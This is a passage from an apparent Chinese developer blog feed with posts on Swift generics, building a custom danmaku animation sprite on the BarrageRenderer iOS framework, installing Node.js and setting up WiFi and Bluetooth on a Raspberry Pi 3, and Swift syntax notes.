        return self.viewModel as! Sub1ViewModel
    }
} 

</code></pre>

<p>但是这两种方法仍然不够优雅，产生了很多冗余的代码，笔者在实践中尝试着使用泛型来是基类的属性类型动态化，是代码看起来更优雅</p>

<pre><code class="language-Swift">
class ViewModel{
}

class Controller&lt;ModelType:ViewModel&gt; {
    var viewModel:ModelType
    init(viewModel:ModelType) {
        self.viewModel = viewModel
    }
}

class Sub1ViewModel:ViewModel{  
    let desc = &quot;Sub1&quot;
}

class Sub1Controller:Controller&lt;Sub1ViewModel&gt;{
      var description{
        return self.viewModel.desc
    }
}
</code></pre>

<p>通过ModelType泛型类型，使得在Sub1Controller中直接通过viewModel就能访问到Sub1ViewModel的属性</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[基于BarrageRender自定义弹幕动画]]></title>
    <link href="https://blog.mylonly.com/14951753262754.html"/>
    <updated>2017-05-19T14:28:46+08:00</updated>
    <id>https://blog.mylonly.com/14951753262754.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p><a href="https://github.com/unash/BarrageRenderer">BarrageRender</a> 是iOS上一个非常出名的弹幕渲染开源框架,其可以让我们在App中非常方便的集成弹幕功能，其作者在代码中提供了两种方式的弹幕动画，<code>BarrageFloatSprite</code>和<code>BarrageWalkSprite</code>。可以说移动和浮动这两种动画方式基本上已经满足了大部分App的需求，但是仍然有部分App需要在弹幕的展现形式上更加的自由，例如各大直播平台的礼物弹幕。笔者将在这篇文章中分享自己在BarrageRender的基础上编写自定义礼物弹幕的过程。</p>
</blockquote>

<p><mark><em>BarrageRender目前已更新到2.0.1,自定义弹幕的机制有改变，本篇文章的代码在2.0.1下不起作用，如果想按照本文中用的方法，请使用1.9.1版本的BarrageRender。后续会更新2.0.1版本下的自定义弹幕</em></mark></p>

<h3 id="toc_0">先展示效果</h3>

<p><img src="https://pic.mylonly.com/2017-05-19-1234.gif" alt="弹幕效果"/></p>

<h3 id="toc_1">再介绍BarrageWalkSprite原理</h3>

<blockquote>
<p>BarrageWalkSprite和本文将要实现的自定义Sprite有一定的关联性，所以就通过分析BarrageWalkSprite的源码来展示BarrageRender渲染弹幕的原理，另外一个BarrageFloatSprite的渲染方式稍有不同，但是如果你能搞清楚BarrageWalkSprite的原理，理解FloatSprite的渲染方式也是很轻松的。</p>
</blockquote>

<h4 id="toc_2">弹幕的初始位置</h4>

<p>BarrageRender在BarrageDispatcher的调度下触发activeWithContext方法，而在此方法中，BarrageRender调用了Sprite的originInBounds:withSprite方法来确定每个精灵的初始位置</p>

<pre><code class="language-Objc">   - (void)activeWithContext:(NSDictionary *)context
    {
        CGRect rect = [[context objectForKey:kBarrageRendererContextCanvasBounds]CGRectValue];
        NSArray * sprites = [context objectForKey:kBarrageRendererContextRelatedSpirts];
        NSTimeInterval timestamp = [[context objectForKey:kBarrageRendererContextTimestamp]doubleValue];
        _timestamp = timestamp;
        _view = [self bindingView];
        [self configView];
        [_view sizeToFit];
        if (!CGSizeEqualToSize(_mandatorySize, CGSizeZero)) {
            _view.frame = CGRectMake(0, 0, _mandatorySize.width, _mandatorySize.height);
        }
        _origin = [self originInBounds:rect withSprites:sprites];
        _view.frame = CGRectMake(_origin.x, _origin.y, self.size.width, self.size.height);
    }
</code></pre>

<p>BarrageWalkSpirte在originInBounds:withSprite方法中,根据当前屏幕上已经存在的Sprite来计算自己的初始位置。</p>

<pre><code class="language-Objc">    
- (CGPoint)originInBounds:(CGRect)rect withSprites:(NSArray *)sprites
{
   // 获取同方向精灵
   NSMutableArray * synclasticSprites = [[NSMutableArray alloc]initWithCapacity:sprites.count];
   for (BarrageWalkSprite * sprite in sprites) {
       if (sprite.direction == _direction &amp;&amp; sprite.side == self.side) { // 找寻同道中人
           [synclasticSprites addObject:sprite];
       }
   }
   
   static BOOL const AVAERAGE_STRATEGY = YES; // YES:条纹平均精灵策略(体验会好一些); NO:最快时间策略
   NSTimeInterval stripMaxActiveTimes[STRIP_NUM]={0}; // 每一条网格 已有精灵中最后退出屏幕的时间
   NSUInteger stripSpriteNumbers[STRIP_NUM]={0}; // 每一条网格 包含精灵的数目
   NSUInteger stripNum = MIN(STRIP_NUM, MAX(self.trackNumber, 1)); // between (1,STRIP_NUM)
   CGFloat stripHeight = rect.size.height/stripNum; // 水平条高度
   CGFloat stripWidth = rect.size.width/stripNum; // 竖直条宽度
   BOOL oritation = _direction == BarrageWalkDirectionL2R || _direction == BarrageWalkDirectionR2L; // 方向, YES代表水平弹幕
   BOOL rotation = self.side == [self defaultSideWithDirection:_direction];
   /// 计算数据结构,便于应用算法
   NSUInteger overlandStripNum = 1; // 横跨网格条数目
   if (oritation) { // 水平
       overlandStripNum = (NSUInteger)ceil((double)self.size.height/stripHeight);
   }
   else // 竖直
   {
       overlandStripNum = (NSUInteger)ceil((double)self.size.width/stripWidth);
   }
   /// 当前精灵需要的时间,左边碰到边界, 不是真实的活跃时间
   NSTimeInterval maxActiveTime = oritation?rect.size.width/self.speed:rect.size.height/self.speed;
   NSUInteger availableFrom = 0;
   NSUInteger leastActiveTimeStrip = 0; // 最小时间的行
   NSUInteger leastActiveSpriteStrip = 0; // 最小网格的行
   
   for (NSUInteger i = 0; i &lt; stripNum; i++) {
       //寻找当前行里包含的sprites
       CGFloat stripFrom = i * (oritation?stripHeight:stripWidth);
       CGFloat stripTo = stripFrom + (oritation?stripHeight:stripWidth);
       if (!rotation) {
           CGFloat preStripFrom = stripFrom;
           stripFrom = (oritation?rect.size.height:rect.size.width) - stripTo;
           stripTo = (oritation?rect.size.height:rect.size.width) - preStripFrom;
       }
       CGFloat lastDistanceAllOut = YES;
       for (BarrageWalkSprite * sprite in synclasticSprites) {
           CGFloat spriteFrom = oritation?sprite.origin.y:sprite.origin.x;
           CGFloat spriteTo = spriteFrom + (oritation?sprite.size.height:sprite.size.width);
           if ((spriteTo-spriteFrom)+(stripTo-stripFrom)&gt;MAX(stripTo-spriteFrom, spriteTo-stripFrom)) { // 在条条里
               stripSpriteNumbers[i]++;
               NSTimeInterval activeTime = [sprite estimateActiveTime];
               if (activeTime &gt; stripMaxActiveTimes[i]){ // 获取最慢的那个
                   stripMaxActiveTimes[i] = activeTime;
                   CGFloat distance = oritation?fabs(sprite.position.x-sprite.origin.x):fabs(sprite.position.y-sprite.origin.y);
                   lastDistanceAllOut = distance &gt; (oritation?sprite.size.width:sprite.size.height);
               }
           }
       }
       if (stripMaxActiveTimes[i]&gt;maxActiveTime || !lastDistanceAllOut) {
           availableFrom = i+1;
       }
       else if (i - availableFrom &gt;= overlandStripNum - 1){
           break; // eureka!
       }
       if (i &lt;= stripNum - overlandStripNum) {
           if (stripMaxActiveTimes[i] &lt; stripMaxActiveTimes[leastActiveTimeStrip]) {
               leastActiveTimeStrip = i;
           }
           if (stripSpriteNumbers[i] &lt; stripSpriteNumbers[leastActiveSpriteStrip]) {
               leastActiveSpriteStrip = i;
           }
       }
   }
   if (availableFrom &gt; stripNum - overlandStripNum) { // 那就是没有找到喽
       availableFrom = AVAERAGE_STRATEGY?leastActiveSpriteStrip:leastActiveTimeStrip; // 使用最小个数 or 使用最短时间
   }
   
   CGPoint origin = CGPointZero;
   if (oritation) { // 水平
       _destination.y = origin.y = (rotation?stripHeight*availableFrom:rect.size.height-stripHeight * availableFrom-self.size.height)+rect.origin.y;
       origin.x = (self.direction == BarrageWalkDirectionL2R)?rect.origin.x - self.size.width:rect.origin.x + rect.size.width;
       _destination.x = (self.direction == BarrageWalkDirectionL2R)?rect.origin.x + rect.size.width:rect.origin.x - self.size.width;
   }
   else
   {
       _destination.x = origin.x = (rotation?stripWidth*availableFrom:rect.size.width-stripWidth*availableFrom -self.size.width)+rect.origin.x;
       origin.y = (self.direction == BarrageWalkDirectionT2B)?rect.origin.y - self.size.height:rect.origin.y + rect.size.height;
       _destination.y = (self.direction == BarrageWalkDirectionT2B)?rect.origin.y + rect.size.height:rect.origin.y - self.size.height;
   }
   return origin;
}
</code></pre>

<p>代码虽然很长，但是主要就是为了实现下面几个逻辑:</p>

<pre><code>1. BarrageWalkSprite先获取了同方向的所有精灵
2. 根据屏幕轨道的frame范围找到每一个轨道内的所有精灵
3. 在同一轨道内的所有精灵中找到存活时间最长的精灵(速度最慢)
4. 判断速度最慢的那个精灵的尾部是否已经完全进入弹幕显示区域
5. 如果速度最慢的精灵尾部已经进入弹幕显示区域，则可以确定自己的可以紧跟在后面出现，如果还没有完全进入弹幕显示区域，则继续在下一个轨道获取合适的位置
6. 根据计算得到的自己可以出现的轨道，加上该轨道上最后一个精灵的位置，得到自己的起始位置
</code></pre>

<h4 id="toc_3">弹幕的运动轨迹</h4>

<p>BarrageRender绘制每个精灵的运动轨迹的方式非常简单，在BarrageRender中，内置的时钟引擎<code>BarrageClock</code>负责在间隔时间内调用所有已经激活精灵基类<code>BarrageSprite</code>中的updateWithTime方法。</p>

<pre><code class="language-Objc">   - (void)initClock
    {
        __weak id weakSelf = self;
        _clock = [BarrageClock clockWithHandler:^(NSTimeInterval time){
            BarrageRenderer * strongSelf = weakSelf;
            strongSelf-&gt;_time = time;
            [strongSelf update];
        }];
    }
    
    /// 每个刷新周期执行一次
    - (void)update
    {
        [_dispatcher dispatchSprites]; // 分发精灵
        for (BarrageSprite * sprite in _dispatcher.activeSprites) {
            [sprite updateWithTime:_time];
        }
    }

</code></pre>

<p>而在<code>BarrageSprite</code>的updateWithTime方法中, 每个精灵重新更改了自身的frame属性，以此来达到动画位移的效果。其中<code>_valid</code>属性是Sprite存活的唯一标志，标记为NO之后，Sprite就会从队列中彻底移除</p>

<pre><code class="language-Objc">     //BarrageSprite
   - (void)updateWithTime:(NSTimeInterval)time
    {
        _valid = [self validWithTime:time];
        _view.frame = [self rectWithTime:time];
    }
</code></pre>

<p>BarrageWalkSprite通过属性speed来实时改变自己的frame位置,同时计算剩下的destination和speed来算出自己的存活时间以用来标记valid属性</p>

<pre><code class="language-Objc">  //BarrageWalkSprite
  
  - (BOOL)validWithTime:(NSTimeInterval)time
    {
        return [self estimateActiveTime] &gt; 0;
    }
    
  - (NSTimeInterval)estimateActiveTime
    {
        CGFloat activeDistance = 0;
        switch (_direction) {
            case BarrageWalkDirectionR2L:
                activeDistance = self.position.x - _destination.x;
                break;
            case BarrageWalkDirectionL2R:
                activeDistance = _destination.x - self.position.x;
                break;
            case BarrageWalkDirectionT2B:
                activeDistance = _destination.y - self.position.y;
                break;
            case BarrageWalkDirectionB2T:
                activeDistance = self.position.y - _destination.y;
            default:
                break;
        }
        return activeDistance/self.speed;
    }
  
  - (CGRect)rectWithTime:(NSTimeInterval)time
    {
        CGFloat X = self.destination.x - self.origin.x;
        CGFloat Y = self.destination.y - self.origin.y;
        CGFloat L = sqrt(X*X + Y*Y);
        NSTimeInterval duration = time - self.timestamp;
        CGPoint position = CGPointMake(self.origin.x + duration * self.speed * X/L, self.origin.y + duration * self.speed * Y/L);
        return CGRectMake(position.x, position.y, self.size.width, self.size.height);
    }
    
</code></pre>

<h4 id="toc_4">弹幕终点</h4>

<p>BarrageWalkSprite的终点计算很简单，弹幕的显示的距离加上Sprite自身的宽度就是整个精灵需要位移的距离，这个destination的计算已经体现在了起点位置的获取当中</p>

<pre><code class="language-Objc">CGPoint origin = CGPointZero;
if (oritation) { // 水平
   _destination.y = origin.y = (rotation?stripHeight*availableFrom:rect.size.height-stripHeight * availableFrom-self.size.height)+rect.origin.y;
   origin.x = (self.direction == BarrageWalkDirectionL2R)?rect.origin.x - self.size.width:rect.origin.x + rect.size.width;
   _destination.x = (self.direction == BarrageWalkDirectionL2R)?rect.origin.x + rect.size.width:rect.origin.x - self.size.width;
}
else
{
   _destination.x = origin.x = (rotation?stripWidth*availableFrom:rect.size.width-stripWidth*availableFrom -self.size.width)+rect.origin.x;
   origin.y = (self.direction == BarrageWalkDirectionT2B)?rect.origin.y - self.size.height:rect.origin.y + rect.size.height;
   _destination.y = (self.direction == BarrageWalkDirectionT2B)?rect.origin.y + rect.size.height:rect.origin.y - self.size.height;
}
return origin;
</code></pre>

<h3 id="toc_5">自定义Sprite</h3>

<blockquote>
<p>BarrageBubblingSprite的运动轨迹和BarrageWalkSprite有很多重合之处，所以自定义的BarrageBubblingSprite直接继承BarrageWalkSprite以获取其direction,side,speed,trackNumber等多个属性，当然还需要另外加上加速度speedUp和停留时间stay属性</p>
</blockquote>

<pre><code class="language-Objc">@interface BarrrageBubblingSprite : BarrageWalkSprite

@property (nonatomic,assign) CGFloat speedUp; //加速度

@property (nonatomic,assign) CGFloat stay; //到达终点后的停留时间

@end
</code></pre>

<h4 id="toc_6">起点位置</h4>

<p>BubblingSprite的起点位置的获取逻辑和WalkSprite的起点逻辑类似，不同的地方在于:</p>

<ol>
<li><em>即使轨道内最慢的那个精灵已经完全进入弹幕显示区域，只要该精灵仍然存活，就不能紧跟其后,而是要另外找寻其他轨道</em></li>
<li><em>当所有轨道都已经有精灵占据的时候，找到存活时间最短的那个精灵，通过将其的stay属性设置为0让其直接消失，然后让自己占据该精灵所在轨道</em></li>
</ol>

<pre><code class="language-Objc">- (CGPoint)originInBounds:(CGRect)rect withSprites:(NSArray *)sprites
{
    // 获取同方向精灵
    NSMutableArray * synclasticSprites = [[NSMutableArray alloc]initWithCapacity:sprites.count];
    for (BarrageWalkSprite * sprite in sprites) {
        if (sprite.direction == self.direction &amp;&amp; sprite.side == self.side) { // 找寻同道中人
            [synclasticSprites addObject:sprite];
        }
    }
    
    NSUInteger stripNum = MIN(STRIP_NUM, MAX(self.trackNumber, 1)); // between (1,STRIP_NUM)
    CGFloat stripHeight = rect.size.height/stripNum; // 水平条高度
    CGFloat stripWidth = rect.size.width/stripNum; // 竖直条宽度
    BOOL oritation = self.direction == BarrageWalkDirectionL2R || self.direction == BarrageWalkDirectionR2L; // 方向, YES代表水平弹幕
    BOOL rotation = self.side == [self defaultSideWithDirection:self.direction];
    /// 计算数据结构,便于应用算法
    NSUInteger overlandStripNum = 1; // 横跨网格条数目
    if (oritation) { // 水平
        overlandStripNum = (NSUInteger)ceil((double)self.size.height/stripHeight);
    }
    else // 竖直
    {
        overlandStripNum = (NSUInteger)ceil((double)self.size.width/stripWidth);
    }

    NSUInteger availableFrom = 0;
    BarrrageBubblingSprite* lastTimeSprite = self;
    NSInteger lastSpriteIndex = 0;
    
    
    for (NSUInteger i = 0; i &lt; stripNum; i++) {
        //寻找当前行里包含的sprites
        CGFloat stripFrom = i * (oritation?stripHeight:stripWidth);
        CGFloat stripTo = stripFrom + (oritation?stripHeight:stripWidth);
        if (!rotation) {
            CGFloat preStripFrom = stripFrom;
            stripFrom = (oritation?rect.size.height:rect.size.width) - stripTo;
            stripTo = (oritation?rect.size.height:rect.size.width) - preStripFrom;
        }
        CGFloat exsitSprite = NO;
        for (BarrrageBubblingSprite * sprite in synclasticSprites) {
            CGFloat spriteFrom = oritation?sprite.origin.y:sprite.origin.x;
            CGFloat spriteTo = spriteFrom + (oritation?sprite.size.height:sprite.size.width);
            if ((spriteTo-spriteFrom)+(stripTo-stripFrom)&gt;MAX(stripTo-spriteFrom, spriteTo-stripFrom)) { // 在条条里
                exsitSprite = YES;
              
                if (sprite.timestamp &lt; lastTimeSprite.timestamp){
                    lastTimeSprite = sprite;
                    lastSpriteIndex = i;
                }
                break;
            }
        }
        if (exsitSprite) {
            availableFrom = i+1;
        }else{ //第一行就是空的
            break;
        }
        
    }
    if (availableFrom == stripNum) { // 超出最大的轨道数，挤掉最上层精灵
        availableFrom = lastSpriteIndex;
        lastTimeSprite.stay = 0;
    }
    
    CGPoint origin = CGPointZero;
    if (oritation) { // 水平
        _destination.y = origin.y = (rotation?stripHeight*availableFrom:rect.size.height-stripHeight * availableFrom-self.size.height)+rect.origin.y;
        origin.x = (self.direction == BarrageWalkDirectionL2R)?rect.origin.x - self.size.width:rect.origin.x + rect.size.width;
        _destination.x = (self.direction == BarrageWalkDirectionL2R)?rect.origin.x + rect.size.width - self.size.width :rect.origin.x + self.size.width;
    }
    else
    {
        _destination.x = origin.x = (rotation?stripWidth*availableFrom:rect.size.width-stripWidth*availableFrom -self.size.width)+rect.origin.x;
        origin.y = (self.direction == BarrageWalkDirectionT2B)?rect.origin.y - self.size.height:rect.origin.y + rect.size.height;
        _destination.y = (self.direction == BarrageWalkDirectionT2B)?rect.origin.y + rect.size.height - self.size.height:rect.origin.y + self.size.height;
    }
    return origin;

</code></pre>

<h4 id="toc_7">运动轨迹</h4>

<p>BarrageBubblingSprite的运动轨迹和BarrageWalkSprite的运动轨迹不同的地方在于，BarrageWalkSprite是匀速前进，二BarrageBubblingSprite是加速前进，这样，在计算某个时段Sprite的位置就需要考虑加速度的存在。</p>

<pre><code class="language-Objc">- (CGRect)rectWithTime:(NSTimeInterval)time{
    CGFloat X = self.destination.x - self.origin.x;
    CGFloat Y = self.destination.y - self.origin.y;
        
    CGFloat L = sqrt(X*X + Y*Y);
    NSTimeInterval duration = time - self.timestamp;
    CGPoint position = CGPointMake(self.origin.x + duration * self.speed * X/L, self.origin.y + duration * self.speed * Y/L);
    if (position.x &gt;= self.destination.x) {
        position.x = self.destination.x;
    }else{
        self.destinationStamp = time;
        self.speed = duration*self.speedUp;
    }
    if(position.y &gt;= self.destination.y) {
        position.y = self.destination.y;
      
    }else{
        self.destinationStamp = time;
        self.speed = duration*self.speedUp;
    }
    return CGRectMake(position.x, position.y, self.size.width, self.size.height);
}
</code></pre>

<p>在存活时间上，与BarrageWalkSprite不同的地方在于，BarrageWalkSprite在位移到终点的时候消失，而BarrageBubblingSprite在到达终点之后仍然需要停留stay的时间。这里引入了currentStamp和destinationStamp时间戳用于来计算stay时间是否已经到达。</p>

<pre><code class="language-Objc">//计算精灵的剩余存活时间

- (double)countTimeByDistance:(CGFloat)distance{
    CGFloat a = 0.5*self.speedUp;
    CGFloat b = self.speed;
    CGFloat c = -distance;
    CGFloat delt = sqrt(b*b - 4*a*c);
    double t = (-b+delt)/(2*a);
    return t;
}

- (NSTimeInterval)estimateActiveTime
{
    CGFloat activeDistance = 0;
    switch (self.direction) {
        case BarrageWalkDirectionR2L:
            activeDistance = self.position.x - _destination.x;
            break;
        case BarrageWalkDirectionL2R:
            activeDistance = _destination.x - self.position.x;
            break;
        case BarrageWalkDirectionT2B:
            activeDistance = _destination.y - self.position.y;
            break;
        case BarrageWalkDirectionB2T:
            activeDistance = self.position.y - _destination.y;
        default:
            break;
    }
    NSTimeInterval leftTime = 0.0;
    CGFloat time = [self countTimeByDistance:activeDistance];
    if (time &gt; 0){
        leftTime = time + self.stay;
    }else{
        leftTime = self.stay - (self.currentStamp - self.destinationStamp);
    }
    return leftTime;
}

- (BOOL)validWithTime:(NSTimeInterval)time{
    self.currentStamp = time;
    return  [self estimateActiveTime] &gt; 0;
}
</code></pre>

<h4 id="toc_8">自定义弹幕样式</h4>

<p>类似BarrageWalkImageSprite，我们也通过继承BarrageSpirte的bindingView 来将自定义的弹幕view返回给BarrageRender</p>

<h3 id="toc_9">完整代码</h3>

<p><a href="https://github.com/mylonly/BarrageRender-BubblingSprite">BarrageRender-BubblingSprite</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[树莓派3安装Node.js]]></title>
    <link href="https://blog.mylonly.com/14945010672564.html"/>
    <updated>2017-05-11T19:11:07+08:00</updated>
    <id>https://blog.mylonly.com/14945010672564.html</id>
    <content type="html"><![CDATA[
<p>(树莓派官方系统)<br/>
<img src="https://pic.mylonly.com/2016-06-29_14634631824044.jpg" alt="2016-06-29_14634631824044.jpg"/></p>

<pre><code class="language-Bash">wget https://nodejs.org/dist/v5.2.0/node-v5.2.0-linux-armv7l.tar.gz
tar zxvf node-v5.2.0-linux-armv7l.tar.gz
cd node-v5.2.0-linux-armv7l
sudo cp bin/* /usr/bin/ -r
sudo cp include/ /usr/include/ -r
sudo cp lib/ /usr/lib/ -r
sudo cp share/ /usr/share/ -r
cd ..
node --version
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[树莓派3命令行连接WiFi和蓝牙设备]]></title>
    <link href="https://blog.mylonly.com/14945010588526.html"/>
    <updated>2017-05-11T19:10:58+08:00</updated>
    <id>https://blog.mylonly.com/14945010588526.html</id>
    <content type="html"><![CDATA[
<p>转载<a href="https://www.embbnux.com/2016/04/10/raspberry_pi_3_wifi_and_bluetooth_setting_on_console/">原文链接</a></p>

<p><img src="https://pic.mylonly.com/2016-06-29_14634631824044.jpg" alt="2016-06-29_14634631824044.jpg"/></p>

<h3 id="toc_0">WiFi连接</h3>

<pre><code>pi@raspi3:~ $ iwlist scan
wlan0 Scan completed :
Cell 01 - Address: 00:1E:20:50:AA:BB
Channel:8
Frequency:2.447 GHz (Channel 8)
Quality=70/70 Signal level=-32 dBm
Encryption key:on
ESSID:&quot;WIFINAME&quot;
Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
9 Mb/s; 12 Mb/s; 18 Mb/s
Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
Mode:Master
Extra:tsf=0000000000000000
Extra: Last beacon: 2157000ms ago
IE: Unknown: 000546616E6379
IE: Unknown: 010882848B960C121824
IE: Unknown: 030108
IE: Unknown: 050401020000
IE: Unknown: 0706303020010B14
IE: Unknown: 2A0100
IE: Unknown: 32043048606C
IE: IEEE 802.11i/WPA2 Version 1
Group Cipher : TKIP
Pairwise Ciphers (2) : CCMP TKIP
Authentication Suites (1) : PSK
IE: Unknown: 7F080000000000000040
IE: Unknown: DD180050F2020101000003A4000027A4000042435E0062322F00
 
可以看到周围的wifi热点信息
配置连接到某个热点:
 
# 编辑wifi文件
sudo vim /etc/wpa_supplicant/wpa_supplicant.conf
# 在该文件最后添加下面的话
network={
  ssid=&quot;WIFINAME&quot;
  psk=&quot;password&quot;
}
# 引号部分分别为wifi的名字和密码
# 保存文件后几秒钟应该就会自动连接到该wifi
# 查看是否连接成功
ifconfig wlan0

</code></pre>

<h3 id="toc_1">蓝牙连接</h3>

<pre><code>pi@raspi3:~ $ sudo bluetoothctl
[NEW] Controller BB:27:EB:0D:9D:DD raspi3 [default]
[bluetooth]# list
Controller BB:27:EB:0D:9D:DD raspi3 [default]
[bluetooth]# power on
Changing power on succeeded
[bluetooth]# scan on
Discovery started
[CHG] Controller BB:27:EB:0D:9D:DD Discovering: yes
[NEW] Device E8:07:BF:3A:25:AA NDZ-03-GA
[CHG] Device E8:07:BF:3A:25:AA RSSI: -66
[bluetooth]# agent on
Agent registered
[CHG] Device E8:07:BF:3A:25:AA RSSI: -56
[bluetooth]# pair E8:07:BF:3A:25:AA
Attempting to pair with E8:07:BF:3A:25:AA
[CHG] Device E8:07:BF:3A:25:AA Connected: yes
[CHG] Device E8:07:BF:3A:25:AA UUIDs:
    00001108-0000-1000-8000-00805f9b34ff
[CHG] Device E8:07:BF:3A:25:AA Paired: yes
Pairing successful
[CHG] Device E8:07:BF:3A:25:AA Connected: no
[bluetooth]# trust E8:07:BF:3A:25:AA
[CHG] Device E8:07:BF:3A:25:AA Trusted: yes
Changing E8:07:BF:3A:25:AA trust succeeded
[bluetooth]# connect E8:07:BF:3A:25:AA

</code></pre>

<p>这样就连上蓝牙设备了，如果是蓝牙音响的话还得装下支持软件:<br/>
 <code><br/>
sudo apt-get install pulseaudio pulseaudio-module-bluetooth<br/>
</code></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Swift要点]]></title>
    <link href="https://blog.mylonly.com/14944977278738.html"/>
    <updated>2017-05-11T18:15:27+08:00</updated>
    <id>https://blog.mylonly.com/14944977278738.html</id>
    <content type="html"><![CDATA[
<p>(本文所有代码样例全部来自Swift2.0官方文档)</p>

<ol>
<li><p>Swift类型间不会隐式转换，必须要显式转换。将值转换成字符串除了使用String()显式转换外，还有中简单的方法,如下:</p>

<pre><code class="language-Swift">let apples = 3
let oranges = 5
let appleSummary = &quot;I have \(apples) apples.&quot;
let fruitSummary = &quot;I have \(apples + oranges)  pieces of fruit.&quot;
</code></pre>

<p>输出:</p>

<pre><code>&quot;I have 3 apples&quot;
&quot;I have 8 pieces of fruit&quot;
</code></pre></li>
<li><p>Swift声明数组或者字典可以声明指定类型</p>

<pre><code class="language-Swift">let emptyArray = [String]()
let emptyDictionary = [String: Float]()
</code></pre></li>
<li><p>if语句中，条件必须是一个布尔表达式,如下:</p>

<pre><code class="language-Swift"> if score &gt; 50 {
    teamScore += 3
} else {
       teamScore += 1
}
</code></pre>

<p><code>if 1 {}</code> 这样代码会报错，但是<code>if true{}</code>这样的代码是可  以的。</p></li>
<li><p>Switch 支持任意类型的数据以及各种比较，不仅仅限于整数以及判断是否相等,而且Switch匹配到相应的子句之后就会推出整个Switch,不需要给每个Switch子句写上break了。</p>

<pre><code class="language-Swift">let vegetable = &quot;red pepper&quot;
switch vegetable {
case &quot;celery&quot;:
    print(&quot;Add some raisins and make ants on a  log.&quot;)
case &quot;cucumber&quot;, &quot;watercress&quot;:
    print(&quot;That would make a good tea sandwich.&quot;)
case let x where x.hasSuffix(&quot;pepper&quot;):
    print(&quot;Is it a spicy \(x)?&quot;)
default:
    print(&quot;Everything tastes good in soup.&quot;)
}
</code></pre>

<p><em>Swift 子句中必须要遍历所有可能，否则会报错</em><br/>
<em>上述代码中的lex表达式将匹配等式的值赋给变量x</em></p></li>
<li><p>do{}while()被repeat{}while()取代</p>

<pre><code class="language-Swift">var m = 2
repeat {
    m = m * 2
} while m &lt; 100
print(m)
</code></pre></li>
<li><p>循环有更简便的写法,0..&lt;4表示遍历0到4(不包含4，包含4用0...4),传统写法也是支持的。</p>

<pre><code class="language-Swift">var firstForLoop = 0
for i in 0..&lt;4 {
    firstForLoop += i
}
print(firstForLoop)

var firstForLoop = 0
for i in 0...4 {
    firstForLoop += i
}
print(firstForLoop)
</code></pre></li>
<li><p>函数可以传入可变的参数，参数在函数内表现为数组形式:<br/>
<code>Swift<br/>
func sumOf(numbers: Int...) -&gt; Int {<br/>
var sum = 0<br/>
for number in numbers {<br/>
    sum += number<br/>
}<br/>
return sum<br/>
}<br/>
sumOf()<br/>
sumOf(42, 597, 12)<br/>
</code></p></li>
<li><p>函数可以作为另一个函数的返回值，类似于OC中的block</p>

<pre><code class="language-Swift">func makeIncrementer() -&gt; (Int -&gt; Int) {
func addOne(number: Int) -&gt; Int {
    return 1 + number
}
return addOne
}
var increment = makeIncrementer()
increment(7)
</code></pre>

<p>同理，函数也可以当做参数传入函数,</p>

<pre><code class="language-Swift">func hasAnyMatches(list: [Int], condition: Int -&gt;   Bool) -&gt; Bool {
for item in list {
    if condition(item) {
        return true
    }
}
return false
}
func lessThanTen(number: Int) -&gt; Bool {
    return number &lt; 10
}
var numbers = [20, 19, 7, 12]
hasAnyMatches(numbers, condition: lessThanTen)
</code></pre></li>
<li><p>子类中，如果需要重写父类的方法，需要使用override标记</p>

<pre><code class="language-Swift">class NamedShape {
var numberOfSides: Int = 0
var name: String

init(name: String) {
    self.name = name
}

func simpleDescription() -&gt; String {
        return &quot;A shape with \(numberOfSides) sides.&quot;
  }
}

class Square: NamedShape {
var sideLength: Double

init(sideLength: Double, name: String) {
    self.sideLength = sideLength
    super.init(name: name)
    numberOfSides = 4
}

func area() -&gt;  Double {
    return sideLength * sideLength
}

override func simpleDescription() -&gt; String {
        return &quot;A square with sides of length \(sideLength).&quot;
    }
}
let test = Square(sideLength: 5.2, name: &quot;my test   square&quot;)
test.area()
test.simpleDescription()
</code></pre></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Swift学习要点-基础部分]]></title>
    <link href="https://blog.mylonly.com/14944977101213.html"/>
    <updated>2017-05-11T18:15:10+08:00</updated>
    <id>https://blog.mylonly.com/14944977101213.html</id>
    <content type="html"><![CDATA[
<p><img src="https://pic.mylonly.com/2016-06-29_15:09:33.jpg" alt="2016-06-29_15:09:33.jpg"/></p>

<blockquote>
<p>这一系列的文章都是我本人在学习Swift语法过程中认为需要注意的语法部分，所以介绍的并不会很完整。</p>
</blockquote>

<ol>
<li><p>print函数:<code>print(_:separator:terminator:)</code>,默认情况下print会以换行符当做结束符，此外你可以通过terminator参数更改结束符，例如:</p>

<pre><code class="language-Swift">print(&quot;正常的print结尾时换行符&quot;)                  //输出:正常的print结尾时换行符\n
print(&quot;没有换行符的print&quot;,terminator:&quot;&quot;)         //输出:没有换行符的print
print(&quot;稀奇古怪的结束符都可以&quot;,terminator:&quot;(^^)&quot;)  //输出:稀奇古怪的结束符都可以(^^)
</code></pre></li>
<li><p>数值类字面量，包括整数和浮点数可以添加额外的零并且包含下划线，并不会影响字面量的值</p>

<pre><code class="language-Swift">let paddedDouble = 000123.456
let oneMillion = 1_000_000
let justOverOneMillion = 1_000_000.000_000_1
</code></pre></li>
<li><p>可以通过<code>typealias</code>关键字来定义类型的别名</p>

<pre><code class="language-Swift">typealias AudioSample = UInt16
var maxAmplitudeFound = AudioSample.min // maxAmplitudeFound 现在是 0
</code></pre></li>
<li><p>不同的数据类型之间不会隐式转换,必须要用类型名加上括号的方式进入显示转换,其中显示转换成字符串除了使用String()之外，还可以直接在字符串中适用(其他类型值)来转换</p>

<pre><code class="language-Swift">var maxValue = UInt8.max
var max64Value = Int64.max

max64Value = maxValue  //Error:Cannot assign value of type &#39;UInt8&#39; to type &#39;Int64&#39;
max64Value = Int64(maxValue) //Ok

let number = 3
var str1 = String(number) //str1 = &quot;3&quot;
var str2 = &quot;\(number)&quot;    //str2 = &quot;3&quot; 
</code></pre></li>
<li><p>如果你只需要一部分元组值，分解的时候可以把要忽略的部分用下划线（_）标记：</p>

<pre><code class="language-Swift">let http404Error = (404, &quot;Not Found&quot;)  // http404Error 的类型是 (Int, String)，值是 (404, &quot;Not Found&quot;)
